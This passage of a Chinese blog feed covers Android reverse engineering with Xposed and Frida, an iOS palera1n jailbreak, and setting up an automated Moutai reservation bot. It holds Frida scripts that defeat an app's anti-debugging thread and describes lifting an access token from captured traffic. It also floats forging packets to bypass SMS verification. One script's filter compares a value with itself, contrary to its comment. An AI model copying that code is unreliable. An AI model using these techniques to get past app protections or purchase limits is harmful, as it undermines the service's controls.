<li><p>跟之前hook构造函数的流程差不多，我们同样hook成功获得了目标函数的参数信息和返回值</p>
</li>
<li><p>不同之处在于之前使用的是<code>findAndHookConstructor</code>，这里使用的是<code>findAndHookMethod</code></p>
</li>
<li><p>同样的，<code>findAndHookMethod</code>也有两种传参方式，一种是传入Class，另一种是直接传入类名字符串</p>
<blockquote>
<p>第一种传参：传入class</p>
<img src="/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/image-20231213000458591.png" class="" title="image-20231213000458591">

<p>第二中传参：直接传入类名字符串</p>
<img src="/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/image-20231213000638433.png" class="" title="image-20231213000638433"></blockquote>
</li>
</ul>
<p>跟之前同样的我们也可以在<code>beforeHookedMethod</code>和<code>afterHookedMethod</code>里面修改函数的参数和返回值</p>
<img src="/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/image-20231212234902361.png" class="" title="image-20231212234902361">

<h4 id="内部类中的函数hook"><a href="#内部类中的函数hook" class="headerlink" title="内部类中的函数hook"></a>内部类中的函数hook</h4><p>在Student中添加一个内部类</p>
<img src="/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/image-20231213013606481.png" class="" title="image-20231213013606481">

<ul>
<li><p>调用一下这个内部类并打印返回值</p>
<pre><code class="java">    public String publicFunc(String arg1, int arg2){
        String result = privateFunc("privateFunc", 300);
        person tmp = new person();
        String tmpName = tmp.getPersonName("lisi");
        return arg1 + "---" + arg2 + "---" + result + "---" + tmpName;
    }
</code></pre>
</li>
</ul>
<p>内部类的类名编译后，会有所改变。可以使用GDA打开就可以看到内部类完整的类名</p>
<img src="/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/image-20231213010950930.png" class="" title="image-20231213010950930">

<ul>
<li>拿到内部类的完整类名之后我们就可以跟前面的一样编写hook脚本</li>
</ul>
<p>重新执行查看hook结果</p>
<img src="/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/image-20231213013811248.png" class="" title="image-20231213013811248">

<ul>
<li>成功的拿到了参数和返回值</li>
</ul>
<h4 id="匿名内部类函数的hook"><a href="#匿名内部类函数的hook" class="headerlink" title="匿名内部类函数的hook"></a>匿名内部类函数的hook</h4><p>匿名内部类跟内部类是一样的，只是区别在于匿名内部类在编译的时候编译器会给它生成一个标号作为类名，同样的这种情况我们可以把apk或者dex拖到GDA中去查看它的完整类名</p>
<h4 id="类中JNI函数的hook"><a href="#类中JNI函数的hook" class="headerlink" title="类中JNI函数的hook"></a>类中JNI函数的hook</h4><img src="/2023/12/13/hook%E4%B8%80%E8%88%AC%E5%87%BD%E6%95%B0/image-20231213150251850.png" class="" title="image-20231213150251850">

<p>对上图这种JNI函数的hook也是跟java函数同样的操作</p>
<pre><code class="java">public class HookJNI implements IXposedHookLoadPackage {
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable{
        Log.i("Xposed01", loadPackageParam.packageName);
        XposedBridge.log("Xposed01-&gt;app packagename" + loadPackageParam.packageName);
        if (loadPackageParam.packageName.equals("com.kanxue.loaddex")){
            Class MainActivityClass = XposedHelpers.findClass("com.kanxue.loaddex.MainActivity", loadPackageParam.classLoader);

            XposedHelpers.findAndHookMethod(MainActivityClass, "onCreate", Bundle.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    super.beforeHookedMethod(param);
                    XposedBridge.log("beforeHookedMethod-&gt;onCreate: " + param.args[0]);
                }

                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    XposedBridge.log("afterHookedMethod-&gt;onCreate: " + param.thisObject);
                }
            });
        }
    }
}
</code></pre>
<p>总结：因为这些函数都是有ART产生的ArtMethod对象的，所以都可以用相同的方法hook。但是so文件中的函数没有ArtMethod，所以无法使用这种方法hook。</p>
<h6 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h6><p><a href="https://github.com/xiaoeeyu/Xposed01/blob/master/app/src/main/java/com/xiaoeryu/xposed01/HookJava.java">Hook Java</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Xposed插件开发</tag>
      </tags>
  </entry>
  <entry>
    <title>ios15.7.5越狱</title>
    <url>/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/</url>
    <content><![CDATA[<p>15一下的系统可以使用<strong>CheckRa1n</strong>越狱，15以上的可以使用<strong>palera1n</strong>来越狱。两个工具的流程都差不多。</p>
<p>IOS每次重启之后需要重新越狱。</p>
<p>这里使用制作启动盘的方式来进行刷机，使用balenaEtcher制作就行不多赘述。</p>
<ol>
<li>进去启动盘之后</li>
</ol>
<p>选择Options，进去后，选择Create Faksfs，空格键选中，回车确认！返回之后，一定要确认左上角有-f -c参数</p>
<img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222036105.png" class="" title="image-20230709222036105">

<p>选择Start开始越狱，此时会自动引导手机进入恢复模式</p>
<img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222046618.png" class="" title="image-20230709222046618">

<p>1回车<br>2.将手机电源键和HOME键一起按住(4秒)<br>3.松开电源键，但是保持按住HOME按钮(10秒)<br>4,手机开始自动跑代码，电脑出现进度条，就可以松开按键~</p>
<img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222058624.png" class="" title="image-20230709222058624">

<p><strong>解决办法</strong>：1，按 Ctrl +C 键取消越狱，不要重启手机。回车，输入palera1n_menu，重新开启越狱菜单。2，再次选择Start越狱</p>
<img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222115864.png" class="" title="image-20230709222115864">

<img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222124273.png" class="" title="image-20230709222124273">

<p>重启完成后，iOS设备进入系统之后，重新启动电脑，选择U盘启动，再次来到越狱工具界面，选择Start开始（注意！！！这次不需要选Options，不要选择Create Faksfs），进入第二阶段越狱。</p>
<p>按照前面步骤一样，提示Press Enter when ready for DFU mode后，回车，按照上面步骤操作iOS设备，让它进入DFU模式</p>
<p>如果还是不成功，再重复一遍<strong>解决办法</strong></p>
<img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222142737.png" class="" title="image-20230709222142737">

<p>越狱完成重启后</p>
<img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222215384.png" class="" title="image-20230709222215384">

<p>点击进入palera1n</p>
<img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222231723.png" class="" title="image-20230709222231723">

<p>点击Install，安装越狱环境。这一步，依据网络的不同，有些朋友可能需要很久，甚至会失败。失败就重新来。（如果不行就挂梯子，设置wifi的代理用开了梯子主机的ip和梯子端口）</p>
<p>安装完成后，点击注销Respring即可，恭喜你！越狱完成！</p>
<p>Substitute的安装：进入Sileo，搜索Substitute安装，现在可以启用插件支持！</p>
<p>越狱完成！结束，开始享受越狱！</p>
]]></content>
      <categories>
        <category>ios逆向</category>
      </categories>
      <tags>
        <tag>越狱</tag>
      </tags>
  </entry>
  <entry>
    <title>i茅台+葫芦娃预约平台搭建</title>
    <url>/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>i茅台直接使用docker安装就可以，然后再把葫芦娃平台也添加进去就ok</p>
<h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><blockquote>
<p>系统：Ubuntu</p>
</blockquote>
<ol>
<li><p>更新软件源并添加Docker官方证书</p>
<pre><code>sudo apt-get update
sudo apt-get install ca-certificates curl gnupg
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
sudo chmod a+r /etc/apt/keyrings/docker.gpg
</code></pre>
</li>
<li><p>添加Docker在线安装源</p>
<pre><code>echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  $(. /etc/os-release &amp;&amp; echo "$VERSION_CODENAME") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
</code></pre>
</li>
<li><p>更新软件源</p>
<pre><code>sudo apt-get update
</code></pre>
</li>
<li><p>安装Docker</p>
<pre><code>sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
</code></pre>
</li>
<li><p>验证Docker安装结果</p>
<pre><code>sudo docker run hello-world
</code></pre>
</li>
</ol>
<h2 id="i茅台自动申购预约"><a href="#i茅台自动申购预约" class="headerlink" title="i茅台自动申购预约"></a>i茅台自动申购预约</h2><h4 id="下载官方的Docker部署包，并解压"><a href="#下载官方的Docker部署包，并解压" class="headerlink" title="下载官方的Docker部署包，并解压"></a>下载官方的Docker<a href="https://github.com/oddfar/campus-imaotai/releases">部署包</a>，并解压</h4><p>目前因为官方提供的Docker部署包最新是<strong>V1.0.11</strong>的，如果要使用最新的需要用新版的**.jar<strong>和</strong>dist**把原来旧版的替换掉</p>
<img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514183814359.png" class="" title="image-20240514183814359">

<img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514184323156.png" class="" title="image-20240514184323156">

<ul>
<li>PS：最好在升级葫芦娃之前替换，如果升级完葫芦娃之后再替换的话因为葫芦娃自己也有单独的dist会有冲突</li>
</ul>
<h4 id="修改campus-dockerfile文件"><a href="#修改campus-dockerfile文件" class="headerlink" title="修改campus-dockerfile文件"></a>修改campus-dockerfile文件</h4><img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514192021367.png" class="" title="image-20240514192021367">

<ul>
<li>把原来的java改成<strong>openjdk</strong></li>
</ul>
<h4 id="把需要用到的镜像提前下载下来"><a href="#把需要用到的镜像提前下载下来" class="headerlink" title="把需要用到的镜像提前下载下来"></a>把需要用到的镜像提前下载下来</h4><pre><code>docker pull nginx
docker pull mysql:5.7
docker pull redis
docker pull oddfar/campus-imaotai
</code></pre>
<h4 id="然后进行编译生成对应的镜像文件"><a href="#然后进行编译生成对应的镜像文件" class="headerlink" title="然后进行编译生成对应的镜像文件"></a>然后进行编译生成对应的镜像文件</h4><pre><code>cd campus-imt-V1.0.11
docker-compose build
</code></pre>
<h4 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h4><pre><code>docker-compose up -d
</code></pre>
<img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514184821908.png" class="" title="image-20240514184821908">

<ul>
<li>如果没有报错这时候i茅台就安装成功了</li>
</ul>
<h4 id="浏览器打开"><a href="#浏览器打开" class="headerlink" title="浏览器打开"></a>浏览器打开</h4><p>这里测试是本地安装的所以打开<code>http://127.0.0.1</code>即可</p>
<img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514185052170.png" class="" title="image-20240514185052170">

<h2 id="葫芦娃"><a href="#葫芦娃" class="headerlink" title="葫芦娃"></a>葫芦娃</h2><p>葫芦娃的包是从<a href="https://mp.weixin.qq.com/s/MTZzF9xcIWRlJESkeoG9-w">公众号</a>里面获取的</p>
<h4 id="下载下来之后，上传到i茅台服务部署的目录"><a href="#下载下来之后，上传到i茅台服务部署的目录" class="headerlink" title="下载下来之后，上传到i茅台服务部署的目录"></a>下载下来之后，上传到i茅台服务部署的目录</h4><img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514192346277.png" class="" title="image-20240514192346277">

<h4 id="查看docker的名称"><a href="#查看docker的名称" class="headerlink" title="查看docker的名称"></a>查看docker的名称</h4><p><code>docker ps -a</code></p>
<img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514192805497.png" class="" title="image-20240514192805497">

<ul>
<li><p>我们这里Docker的名称是<strong>campus-server</strong></p>
<img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514193120024.png" class="" title="image-20240514193120024"></li>
</ul>
<h4 id="进入目录执行脚本"><a href="#进入目录执行脚本" class="headerlink" title="进入目录执行脚本"></a>进入目录执行脚本</h4><pre><code>cd maotai-upgrade-v1.3.2
./upgrade-imaotai.sh
</code></pre>
<img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514193324191.png" class="" title="image-20240514193324191">

<h4 id="刷新浏览器查看"><a href="#刷新浏览器查看" class="headerlink" title="刷新浏览器查看"></a>刷新浏览器查看</h4><img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514193420238.png" class="" title="image-20240514193420238">

<h4 id="添加账号"><a href="#添加账号" class="headerlink" title="添加账号"></a>添加账号</h4><p>直接抓电脑上微信公众号的包就行</p>
<img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514193827178.png" class="" title="image-20240514193827178">

<ul>
<li><p>从post包里面拿到<strong>X-Access-Token</strong>，然后选择平台填入token登陆就可以</p>
<img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240514194019140.png" class="" title="image-20240514194019140"></li>
</ul>
<h2 id="使用体验"><a href="#使用体验" class="headerlink" title="使用体验"></a>使用体验</h2><ol>
<li>部署完之后可以成功预约</li>
</ol>
<img src="/2024/06/01/i%E8%8C%85%E5%8F%B0-%E8%91%AB%E8%8A%A6%E5%A8%83%E9%A2%84%E7%BA%A6%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20240601101925881.png" class="" title="image-20240601101925881">

<ol start="2">
<li>现在茅台预约每个月要发短信验证一次，验证窗口还老弹不出来比较麻烦。回头看看能不能构造数据包通过这个短信校验</li>
</ol>
]]></content>
      <categories>
        <category>未定义分类</category>
      </categories>
      <tags>
        <tag>抢茅台</tag>
      </tags>
  </entry>
  <entry>
    <title>libcHook</title>
    <url>/2024/03/25/libcHook/</url>
    <content><![CDATA[<ul>
<li>libc函数符号hook</li>
<li>libc函数参数、返回值打印和替换</li>
<li>主动调用libc读写文件</li>
</ul>
<p>本章主要是对libc中的线程创建函数进行hook以拦截将要执行的函数，以及主动调用libc中创建文件的一系列函数</p>
<h3 id="hook-libc中的函数"><a href="#hook-libc中的函数" class="headerlink" title="hook libc中的函数"></a>hook libc中的函数</h3><p>这里我们以hook下面的反调试函数为例，一般反调试都是新开一个线程来执行的。那我们能不能直接hook线程创建函数来拦截反调试函数的执行呢</p>
<img src="/2024/03/25/libcHook/image-20240324202301195.png" class="" title="image-20240324202301195">

<p>我们先来hook *pthread_create()*把它的参数和返回值打印出来，然后主动调用init函数看看它的执行效果。</p>
<pre><code class="js">function beginAnti(){
    Java.perform(function(){
        Java.choose("com.xiaoeryu.demoso1.MainActivity",{
            onMatch: function(instance){
                console.log("found instance")
                instance.init()
            }, onComplete:function(){
                console.log("Search complete")
            }
        })
    })
}
function hook_pthread(){
    var pthread_create_addr = Module.findExportByName("libc.so", 'pthread_create')
    console.log("pthread_create_addr =&gt; ", pthread_create_addr)
    Interceptor.attach(pthread_create_addr, {
        onEnter: function(args){
            console.log("args =&gt; ", args[0], args[1], args[2], args[3])
        }, onLeave: function(retval){
            console.log("retval =&gt; ", retval)
        }
    })
}

setImmediate(hook_pthread)
</code></pre>
<ul>
<li><p>以spawn模式启动进程看看*pthread_create()*是否hook成功</p>
<p><code>frida -U -f com.xiaoeryu.demoso1 -l libc_hook.js --no-pause</code></p>
</li>
<li><p>再主动调用*init()*执行</p>
<img src="/2024/03/25/libcHook/image-20240325132804060.png" class="" title="image-20240325132804060">

<ul>
<li>执行后成功打印出了参数和返回值，根据函数原型可以知道第三个参数是*detect_frida_loop()*函数的地址</li>
<li>那么怎么让*detect_frida_loop()*不执行从而过掉检测呢</li>
</ul>
</li>
</ul>
<h4 id="替换参数和替换函数"><a href="#替换参数和替换函数" class="headerlink" title="替换参数和替换函数"></a>替换参数和替换函数</h4><ol>
<li><p>hook *pthread_create()*方法，过滤一下如果偏移相同说明是同一个函数，替换掉第三个参数让他去执行一个无关紧要的函数</p>
<pre><code class="js">function hook_pthread(){
    // 查找 libc.so 中 pthread_create 和 time 函数的地址(后面使用time函数的地址来替换原本要执行的函数的地址)
    var pthread_create_addr = Module.findExportByName("libc.so", 'pthread_create')
    var time_addr = Module.findExportByName("libc.so", 'time')
    
    // 打印 pthread_create 和 time 函数的地址
    console.log("pthread_create_addr =&gt; ", pthread_create_addr)
    console.log("time_addr =&gt; ", time_addr)
    
    // 拦截 pthread_create 函数
    Interceptor.attach(pthread_create_addr, {
        onEnter: function(args){
            // 打印 pthread_create 函数的参数
            console.log("args =&gt; ", args[0], args[1], args[2], args[3])
            
            // 查找 libdemoso1.so 的基地址
            var libdemoso1_addr = Module.findBaseAddress("libdemoso1.so")
            if(libdemoso1_addr != null){
                // 打印 libdemoso1.so 的基地址
                console.log("libdemoso1_addr =&gt; ", libdemoso1_addr)
                
                // 计算 detect_frida_loop 函数在 libdemoso1.so 中的偏移量
                var dete_frida_loop_addr = args[2] - libdemoso1_addr
                console.log("detect_frida_loop_offset is =&gt; ", dete_frida_loop_addr)
                
                // 如果 detect_frida_loop 函数的偏移量为 126276，则将 pthread_create 的第三个参数替换为 time 函数的地址
                if(args[2] - libdemoso1_addr == 126276){
                    args[2] = time_addr
                    console.log("end args[2] =&gt; ", args[2])
                }
            }
        }, 
        onLeave: function(retval){
            // 打印 pthread_create 函数的返回值
            console.log("retval =&gt; ", retval)
        }
    })
}
</code></pre>
</li>
<li><p>过滤一下如果符合条件就替换掉*pthread_create()*让其直接返回不执行，不符合过滤条件就让其照旧执行</p>
<pre><code class="js">function replace_pthread(){
    // 查找 libc.so 中 pthread_create 函数的地址
    var pthread_create_addr = Module.findExportByName("libc.so", 'pthread_create')
    console.log("pthread_create_addr =&gt; ", pthread_create_addr)
    
    // 创建一个 NativeFunction 对象，用于调用 pthread_create 函数
    var pthread_create = new NativeFunction(pthread_create_addr, 'int', ['pointer', 'pointer', 'pointer', 'pointer'])
    
    // 替换 pthread_create 函数
    Interceptor.replace(pthread_create_addr, new NativeCallback(function(args0, args1, args2, args3){
        // 打印替换后的 pthread_create 函数的参数
        console.log("replace_pthread args: ", args0, args1, args2, args3)
        
        // 查找 libdemoso1.so 的基地址
        var libdemoso1_addr = Module.findBaseAddress("libdemoso1.so")
        if(libdemoso1_addr != null){
            // 打印 libdemoso1.so 的基地址
            console.log("libdemoso1_addr =&gt; ", libdemoso1_addr)
            
            // 如果 detect_frida_loop 函数的偏移量为 126276，则返回 null
            if(args2 - libdemoso1_addr == args2-libdemoso1_addr){
                console.log("detect_frida_loop_offset is =&gt; ", args2 - libdemoso1_addr)
                return null
            }
        }
        
        // 调用原始的 pthread_create 函数
        return pthread_create(args0, args1, args2, args3)
    }, 'int', ['pointer', 'pointer', 'pointer', 'pointer']
    ))
}
</code></pre>
</li>
</ol>
<p><strong>这里需要注意的一点是，如果设备重启函数的偏移大概率会改变，这时候需要手动修改一下偏移</strong></p>
<h3 id="主动调用libc中的函数"><a href="#主动调用libc中的函数" class="headerlink" title="主动调用libc中的函数"></a>主动调用libc中的函数</h3><p>这里调用libc中的一系列写文件的函数</p>
<pre><code class="js">function writeSomething(){
    // 查找 libc.so 中 fopen、fputs、fclose 函数的地址
    var fopen_addr = Module.findExportByName("libc.so", 'fopen')
    var fputs_addr = Module.findExportByName("libc.so", 'fputs')
    var fclose_addr = Module.findExportByName("libc.so", 'fclose')
    console.log("fopen_addr =&gt; ", fopen_addr, "fputs_addr =&gt; ", fputs_addr, "fclose_addr =&gt; ", fclose_addr)

    // 创建 NativeFunction 对象，用于调用 fopen 函数
    var fopen = new NativeFunction(fopen_addr, 'pointer', ['pointer', 'pointer'])
    // 创建 NativeFunction 对象，用于调用 fputs 函数
    var fputs = new NativeFunction(fputs_addr, 'int', ['pointer', 'pointer'])
    // 创建 NativeFunction 对象，用于调用 fclose 函数
    var fclose = new NativeFunction(fclose_addr, 'int', ['pointer'])

    // 指定文件名和模式
    var fileName = Memory.allocUtf8String("/sdcard/hello.txt")
    var mode = Memory.allocUtf8String("a+")
    
    // 打开文件
    var fp = fopen(fileName, mode)
    
    // 指定要写入的内容
    var context1 = Memory.allocUtf8String("hello world")
    
    // 写入内容到文件中
    fputs(context1, fp)
    
    // 关闭文件
    fclose(fp)
}
</code></pre>
<ul>
<li><p>这里要需要用*Memory.allocUtf8String()<em>将字符串以内存地址的方式传递给</em>fopen()*使用</p>
</li>
<li><p>还需要注意的一个点是如果应用没有写文件权限是无法写入的，测试的时候可以把脚本注入<strong>com.android.settings</strong>等有文件读写权限的应用来测试</p>
<img src="/2024/03/25/libcHook/image-20240325224115284.png" class="" title="image-20240325224115284"></li>
</ul>
<p>接下来尝试将<em>libc.so</em>库的所有导出函数全部写入文件中</p>
<pre><code class="js">function EnumerateAllExports(){
    // 同步枚举所有模块
    var modules = Process.enumerateModulesSync();
    // 遍历所有模块
    for(var i = 0; i &lt; modules.length; i++){
        // 获取当前模块的名称
        var modele_name = modules[i].name;
        // 枚举当前模块的所有导出函数
        var exports = modules[i].enumerateExports();
        // 遍历当前模块的所有导出函数
        for(var j = 0; j &lt; exports.length; j++){
            // 将导出函数的信息写入文件
            // 使用 writeSomething 函数将信息写入到指定的文件路径
            // 导出函数的类型、名称和地址写入文件，以便后续分析
            writeSomething("/sdcard/settings/" + modele_name + ".txt", "type: " + exports[j].type + " name: " + exports[j].name + " addr: " + exports[j].address + "\n");
        }
    }
}
</code></pre>
<ul>
<li>稍微修改一下刚才的*writeSomething()*函数把路径名和写入内容改为传入的两个参数</li>
</ul>
<h6 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h6><p><a href="https://github.com/xiaoeeyu/libc_hook/blob/main/libc_hook.js">本章完整代码</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>框架层Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>linkHook_init_array自吐</title>
    <url>/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/</url>
    <content><![CDATA[<p>本章的主要内容为</p>
<ul>
<li>通过源码分析init_array原理so加载执行流程</li>
<li>hook_linker init_array 自吐</li>
</ul>
<span id="more"></span>

<p>在对<strong>linker</strong>进行hook之前先分析一下so文件的加载流程</p>
<p>在so被加载之后，如果so文件中存在<code>.init</code>和<code>.init_array</code>段的话它们会先被动态链接器调用进行一些初始化的操作。所以这两个函数无论有没有被调用它都会优先执行</p>
<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240405211947048.png" class="" title="image-20240405211947048">

<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240405212720542.png" class="" title="image-20240405212720542">

<ul>
<li>例如这里我们并没有主动调用这个<code>_init()</code>，但是它还是会在so加载的时候主动执行</li>
</ul>
<p>去源码中搜索一下加载so的<code>dlopen</code>函数调用过程</p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>测试用的设备是Android 10.0所以这里以<a href="http://aospxref.com/android-10.0.0_r47/">Android 10.0的源码</a>为例，到目前最新的Android14为止对so的加载都是通过<code>dlopen()</code>进行的</p>
<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240326211109629.png" class="" title="image-20240326211109629">

<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240326211308718.png" class="" title="image-20240326211308718">

<img src="/2024/04/10/linkHook-init-array%E8%87%AA%E5%90%90/image-20240326211337950.png" class="" title="image-20240326211337950">

<pre><code class="c++">void* do_dlopen(const char* name, int flags,
                const android_dlextinfo* extinfo,
                const void* caller_addr) {
    // 创建一个带有"dlopen: "前缀的跟踪对象，用于记录加载库的跟踪信息
  std::string trace_prefix = std::string("dlopen: ") + (name == nullptr ? "(nullptr)" : name);
  ScopedTrace trace(trace_prefix.c_str());
    // 创建一个带有"dlopen: - loading and linking"前缀的跟踪对象，用于记录加载和链接库的跟踪信息
  ScopedTrace loading_trace((trace_prefix + " - loading and linking").c_str());
    // 查找调用者的soinfo结构体
  soinfo* const caller = find_containing_library(caller_addr);
    // 获取调用者的命名空间
  android_namespace_t* ns = get_caller_namespace(caller);
    // 记录dlopen调用的详细信息
  LD_LOG(kLogDlopen,
         "dlopen(name=\"%s\", flags=0x%x, extinfo=%s, caller=\"%s\", caller_ns=%s@%p, targetSdkVersion=%i) ...",
         name,
         flags,
         android_dlextinfo_to_string(extinfo).c_str(),
         caller == nullptr ? "(null)" : caller-&gt;get_realpath(),
         ns == nullptr ? "(null)" : ns-&gt;get_name(),
         ns,
         get_application_target_sdk_version());
    // 创建自动清理对象，用于在作用域结束时调用purge_unused_memory函数
  auto purge_guard = android::base::make_scope_guard([&amp;]() { purge_unused_memory(); });
    // 创建自动清理对象，用于在作用域结束时记录dlopen失败信息
  auto failure_guard = android::base::make_scope_guard(
      [&amp;]() { LD_LOG(kLogDlopen, "... dlopen failed: %s", linker_get_error_buffer()); });
    // 检查flags是否包含无效标志，如果包含则返回nullptr
  if ((flags &amp; ~(RTLD_NOW|RTLD_LAZY|RTLD_LOCAL|RTLD_GLOBAL|RTLD_NODELETE|RTLD_NOLOAD)) != 0) {
    DL_ERR("invalid flags to dlopen: %x", flags);
    return nullptr;
  }
    // 检查extinfo是否包含无效标志，如果包含则返回nullptr
  if (extinfo != nullptr) {
    if ((extinfo-&gt;flags &amp; ~(ANDROID_DLEXT_VALID_FLAG_BITS)) != 0) {
      DL_ERR("invalid extended flags to android_dlopen_ext: 0x%" PRIx64, extinfo-&gt;flags);
      return nullptr;
    }

    if ((extinfo-&gt;flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD) == 0 &amp;&amp;
        (extinfo-&gt;flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET) != 0) {
      DL_ERR("invalid extended flag combination (ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET without "
          "ANDROID_DLEXT_USE_LIBRARY_FD): 0x%" PRIx64, extinfo-&gt;flags);
      return nullptr;
    }

    if ((extinfo-&gt;flags &amp; ANDROID_DLEXT_USE_NAMESPACE) != 0) {
      if (extinfo-&gt;library_namespace == nullptr) {
        DL_ERR("ANDROID_DLEXT_USE_NAMESPACE is set but extinfo-&gt;library_namespace is null");
        return nullptr;
      }
      ns = extinfo-&gt;library_namespace;
    }
  }

  // Workaround for dlopen(/system/lib/&lt;soname&gt;) when .so is in /apex. http://b/121248172
  // The workaround works only when targetSdkVersion &lt; Q.
  std::string name_to_apex;
  if (translateSystemPathToApexPath(name, &amp;name_to_apex)) {
    const char* new_name = name_to_apex.c_str();
    LD_LOG(kLogDlopen, "dlopen considering translation from %s to APEX path %s",
           name,
           new_name);
    // Some APEXs could be optionally disabled. Only translate the path
    // when the old file is absent and the new file exists.
    // TODO(b/124218500): Re-enable it once app compat issue is resolved
    /*
    if (file_exists(name)) {
      LD_LOG(kLogDlopen, "dlopen %s exists, not translating", name);
    } else
    */
    if (!file_exists(new_name)) {
      LD_LOG(kLogDlopen, "dlopen %s does not exist, not translating",
             new_name);
    } else {
      LD_LOG(kLogDlopen, "dlopen translation accepted: using %s", new_name);
      name = new_name;
    }
  }
  // End Workaround for dlopen(/system/lib/&lt;soname&gt;) when .so is in /apex.

  std::string asan_name_holder;

  const char* translated_name = name;
  if (g_is_asan &amp;&amp; translated_name != nullptr &amp;&amp; translated_name[0] == '/') {
    char original_path[PATH_MAX];
    if (realpath(name, original_path) != nullptr) {
